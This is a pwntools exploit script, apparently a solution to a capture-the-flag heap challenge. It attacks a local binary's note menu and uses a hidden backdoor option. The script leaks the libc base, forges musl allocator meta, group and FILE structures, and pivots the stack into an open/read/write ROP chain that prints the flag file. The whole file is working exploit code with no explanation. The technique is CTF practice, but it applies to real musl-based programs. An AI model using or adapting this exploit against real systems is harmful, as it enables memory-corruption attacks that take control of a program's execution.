from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Your choice >> '
def add(content, size=None, name=b'A'*0xF):
	sla(menu, b'1')
	sda(b'Name: ', name)
	if size is None: size = len(content)
	sla(b'Size: ', byte(size))
	if size == len(content): sda(b'Content: ', content)
	else: sla(b'Content: ', content)	

def dele(idx):
	sla(menu, b'2')
	sla(b'Index: ', byte(idx))

def show(idx):
	sla(menu, b'3')
	sla(b'Index: ', byte(idx))

def exit():
	sla(menu, b'4')

def backdoor(addr0, addr1):
	sla(menu, b'1932620593')
	sl(byte(addr0))
	sleep(0.1)
	sl(byte(addr1))
	
for _ in range(5):
	add(b'B'*0x20)
dele(0)
#dele(1)
add(b'A'*0x1000) # 0
add(b'B'*0x1000) # 5
show(5)
rut(b'Name:')
rc(0x10)
libc.address = addr64(b' C') + 0x2aa0
info('libc_base', libc.address)

o = libc.sym.open
r = libc.sym.read
w = libc.sym.write
rdi = libc.address + 0x0000000000015536  # pop rdi ; ret
rsi = libc.address + 0x000000000001b3a9  # pop rsi ; ret
rdx = libc.address + 0x00000000000177c7  # pop rdx ; ret
gadget = libc.address + 0x000000000004bcf3 # mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];
malloc_context = libc.sym.__malloc_context
stderr = libc.sym.__stderr_used

info('open', o)
info('read', r)
info('write', w)
info('__malloc_context', malloc_context)
info('__stderr_used', stderr)

change_byte_by_zero_addr = libc.address - 0x2aa0 + 0x8 + 0x6
fake_file_addr = libc.address - 0x2aa0 + 0x10 
fake_meta_area_addr = libc.address - 0x2aa0 - 0x560
fake_meta_addr = fake_file_addr + 0x100
fake_group_addr = libc.address - 0x2aa0 - 0x100*16 - 0x10 + 0x10
fake_group_to_first_chunk_offset = 0x530
fake_meta_area_to_first_chunk_offset = 0xfe0
end_to_second_chunk_offset = 0xfdc

info('change_byte_by_zero_addr', change_byte_by_zero_addr)
info('fake_file_addr', fake_file_addr)
info('fake_meta_area_addr', fake_meta_area_addr)
info('fake_meta_addr', fake_meta_addr)
info('fake_group_addr', fake_group_addr)

fake_stack = fake_file_addr + 0x200
flag_str = fake_file_addr
flag_buf = fake_file_addr + 0x300

union = 1 + (1<<5) + (27<<6) + (4<<12)
fake_file = b'./flag\x00\x00' + p64(0)*5 + p64(fake_stack) + p64(rdi) + p64(0) + p64(gadget)
fake_meta = p64(fake_file_addr) + p64(stderr) + p64(fake_group_addr) + p64(1) + p64(union)
fake_group = p64(fake_meta_addr) + p64(1) + p64(0)

orw = p64(flag_str) + p64(rsi) + p64(0) + p64(o)
orw+= p64(rdi) + p64(3) + p64(rsi) + p64(flag_buf) + p64(rdx) + p64(0x30) + p64(r)
orw+= p64(rdi) + p64(1) + p64(rsi) + p64(flag_buf) + p64(rdx) + p64(0x30) + p64(w)

dele(5)
pay = fake_file.ljust(0x100, b'\x00') + fake_meta
pay = pay.ljust(0x200, b'\x00')
pay+= orw
pay = pay.ljust(0xfd8, b'\x00')
pay+= p64(5)
add(pay, 0x1000) # 5

backdoor(change_byte_by_zero_addr, malloc_context)
secret = int(rc(18), 16)
info('secret', secret)
fake_meta_area = p64(secret).ljust(0x10, b'\x00')

dele(0)
pay = b'\x00'*0x530 + fake_group 
pay = pay.ljust(0xfd0, b'\x00') + fake_meta_area
add(pay, 0x1000) # 0
dele(5)
exit()
#debug()
sh()


